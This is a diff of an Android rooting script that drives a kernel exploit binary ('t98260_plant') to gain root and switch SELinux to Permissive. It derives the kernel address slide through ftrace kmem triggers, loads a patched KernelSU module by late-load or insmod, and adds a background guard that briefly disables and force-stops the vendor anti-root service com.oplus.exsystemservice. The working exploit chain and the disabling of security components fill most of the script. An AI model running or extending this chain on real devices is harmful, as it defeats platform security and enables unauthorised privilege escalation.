@@ -73,23 +73,52 @@ load_susfs() {
   fi
 }
 
+start_antiroot_guard() {
+  if [ "$DISABLE_ANTIROOT" != "1" ]; then
+    echo "ANTIROOT_SKIP: 开关关闭，未禁用安全组件"
+    return 0
+  fi
+  setsid sh -c "
+    n=0
+    while [ \$n -lt 100 ]; do
+      su -c 'pm disable-user --user 0 com.oplus.exsystemservice' >/dev/null 2>&1 && break
+      sleep 0.1
+      n=\$((n+1))
+    done
+    su -c 'am force-stop com.oplus.exsystemservice' >/dev/null 2>&1
+    sleep 5
+    su -c 'pm enable com.oplus.exsystemservice' >/dev/null 2>&1
+    echo ANTIROOT_RESTORED >> '$D/antiroot.log'
+  " >/dev/null 2>&1 &
+  echo "ANTIROOT_GUARD_BG: 已启动（su 可用后立即禁用，5 秒后恢复）"
+}
+
+wait_kernelsu() {
+  n=0
+  while [ $n -lt 50 ]; do
+    grep -qi kernelsu /proc/modules 2>/dev/null && return 0
+    sleep 0.1
+    n=$((n+1))
+  done
+  return 1
+}
+
+wait_su() {
+  n=0
+  while [ $n -lt 50 ]; do
+    if [ -x /system/bin/su ] && su -c true >/dev/null 2>&1; then return 0; fi
+    sleep 0.1
+    n=$((n+1))
+  done
+  return 1
+}
+
 finish_manager() {
   cp -f "$KSUD" /data/local/tmp/ksud_official 2>/dev/null
   unload_guard
   su -c "/data/local/tmp/ksud_official install" 2>&1
   echo "KSUD_INSTALL_RC=$?"
   install_manager_apk
-  if [ "$DISABLE_ANTIROOT" = "1" ]; then
-    su -c "pm disable-user --user 0 com.oplus.exsystemservice" 2>&1
-    echo "DISABLE_RC=$?"
-    su -c "pkill -9 -f com.oplus.exsystemservice" 2>&1
-    echo "KILL_RC=$?"
-    sleep 5
-    su -c "pm enable com.oplus.exsystemservice" 2>&1
-    echo "ANTIROOT_RESTORED: 已恢复 exsystemservice；如截图等系统功能异常，请软重启（重启 zygote/SystemUI）"
-  else
-    echo "ANTIROOT_SKIP: 开关关闭，未禁用安全组件"
-  fi
   su -c "id; getenforce; grep -i kernelsu /proc/modules" 2>&1
   echo "SU_ID_RC=$?"
   if [ "$(su -c 'id -u' 2>/dev/null | tr -d '\r')" = "0" ]; then
@@ -105,12 +134,14 @@ finish_manager() {
 
 if grep -qi kernelsu /proc/modules 2>/dev/null; then
   echo "ALREADY_LOADED: kernelsu present, skip exploit/load"
+  start_antiroot_guard
+  wait_su || echo "SU_WAIT_TIMEOUT"
   finish_manager
   echo DONE
   exit 0
 fi
 
-echo "[1/5] probe"
+echo "[1/4] probe"
 ./t98260_plant --probe > probe.log 2>&1
 rc=$?
 cat probe.log
@@ -119,54 +150,23 @@ if [ $rc -ne 0 ]; then
   exit 11
 fi
 
-echo "[2/5] capture + solve slide"
-R=/sys/kernel/tracing/events/kmem/rss_stat
-echo 1 > "$R/enable" 2>/dev/null
-printf 'disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
-printf 'disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
-printf 'disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
-SLIDE=""
-for t in 1 2 3; do
-  echo 0 > /sys/kernel/tracing/tracing_on 2>/dev/null
-  : > /sys/kernel/tracing/trace 2>/dev/null
-  sh take_slide.sh
-  if ./prep_solve . syms.txt; then
-    SLIDE=$(cat slide.txt)
-    break
-  fi
-  echo "SLIDE_RETRY=$t"
-done
-printf '!disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
-printf '!disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
-printf '!disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
-if [ -z "$SLIDE" ]; then
-  echo "SOLVE_FAIL"
-  exit 12
-fi
-echo "SLIDE=$SLIDE"
-
-echo "[3/5] run t98260_plant"
+echo "[2/4] run t98260_plant (auto slide)"
 kill -9 $(pidof t98260_plant) 2>/dev/null
 rm -f plant.log t98260-root.sock
-R=/sys/kernel/tracing/events/kmem/rss_stat
-echo 1 > "$R/enable" 2>/dev/null
-printf '!disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
-printf '!disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
-printf '!disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
-setsid ./t98260_plant --slide "$SLIDE" --budget 240 > plant.log 2>&1 &
+setsid ./t98260_plant --auto --budget 240 > plant.log 2>&1 &
 BP=$!
-echo "PLANT_PID=$BP (命中后 SELinux 变 Permissive，约 10-120 秒)"
+echo "PLANT_PID=$BP (命中后 SELinux 变 Permissive)"
 ROOTED=0
 i=0
-while [ $i -lt 110 ]; do
+while [ $i -lt 1100 ]; do
   if grep -q "ROOTD_READY" plant.log 2>/dev/null; then ROOTED=1; break; fi
   if grep -qE "FAIL=(task|selinux|cred|init|probe)" plant.log 2>/dev/null; then break; fi
   if grep -q "PARKED=1" plant.log 2>/dev/null; then break; fi
   kill -0 $BP 2>/dev/null || break
-  if [ $((i % 5)) -eq 0 ]; then
+  if [ $((i % 20)) -eq 0 ]; then
     tail -n 2 plant.log 2>/dev/null | sed 's/^/  | /'
   fi
-  sleep 3
+  sleep 0.3
   i=$((i+1))
 done
 if [ "$ROOTED" != "1" ] || [ "$(getenforce 2>/dev/null)" != "Permissive" ]; then
@@ -176,27 +176,45 @@ if [ "$ROOTED" != "1" ] || [ "$(getenforce 2>/dev/null)" != "Permissive" ]; then
 fi
 echo "PLANT_OK: enforce=Permissive, rootd ready"
 
-echo "[4/5] handoff to $MANAGER"
+echo "[3/4] handoff to $MANAGER"
+start_antiroot_guard
 ./t98260_su -c "$D/$KSUD late-load --kmi android17-6.18 --allow-shell --package-name $MPKG" 2>&1
-sleep 2
-if ! grep -qi kernelsu /proc/modules 2>/dev/null; then
+if ! wait_kernelsu; then
   echo "LATE_LOAD_RETRY: without --kmi"
   ./t98260_su -c "$D/$KSUD late-load --allow-shell --package-name $MPKG" 2>&1
-  sleep 2
 fi
-if ! grep -qi kernelsu /proc/modules 2>/dev/null; then
+if ! wait_kernelsu; then
   echo "LATE_LOAD_FAIL: fallback to insmod ($BASE)"
+  SLIDE=$(sed -n 's/.*SLIDE_DERIVED=0x\([0-9a-f]*\).*/0x\1/p' plant.log 2>/dev/null | tail -n 1)
+  if [ -z "$SLIDE" ]; then
+    echo "SLIDE_MISSING: fallback to take_slide+prep_solve"
+    R=/sys/kernel/tracing/events/kmem/rss_stat
+    echo 1 > "$R/enable" 2>/dev/null
+    printf 'disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
+    printf 'disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
+    printf 'disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
+    sh take_slide.sh
+    ./prep_solve . syms.txt && SLIDE=$(cat slide.txt)
+    printf '!disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
+    printf '!disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
+    printf '!disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
+  fi
+  if [ -z "$SLIDE" ]; then
+    echo "PATCH_FAIL: no slide"
+    exit 14
+  fi
+  echo "SLIDE=$SLIDE"
   ./prep_patch "$BASE" syms.txt "$SLIDE" ksu-98260.ko || { echo "PATCH_FAIL"; exit 14; }
   ./t98260_su -c "insmod $D/ksu-98260.ko" 2>&1
   echo "INSMOD_RC=$?"
-  sleep 2
 fi
-if ! grep -qi kernelsu /proc/modules 2>/dev/null; then
+if ! wait_kernelsu; then
   echo "LOAD_FAIL"
   exit 15
 fi
 echo "MODULE_LOADED"
+wait_su || echo "SU_WAIT_TIMEOUT"
 
-echo "[5/5] manager setup"
+echo "[4/4] manager setup"
 finish_manager
 echo DONE
